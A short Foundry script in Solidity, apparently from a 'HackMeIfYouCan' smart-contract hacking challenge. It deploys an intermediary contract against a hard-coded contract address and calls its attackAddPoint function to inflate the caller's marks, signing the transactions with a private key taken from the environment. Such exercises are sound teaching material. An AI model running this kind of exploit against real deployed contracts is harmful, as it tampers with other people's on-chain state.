// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {AddPointIntermediate} from "../src/AddPointIntermediate.sol";

contract AddPointScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    AddPointIntermediate public addPointIntermediate;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        hackMeIfYouCan = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));

        addPointIntermediate = new AddPointIntermediate(address(hackMeIfYouCan));

        addPointIntermediate.attackAddPoint();

        console.log("Marks after calling addPoint:", hackMeIfYouCan.getMarks(tx.origin));
        vm.stopBroadcast();
    }
}
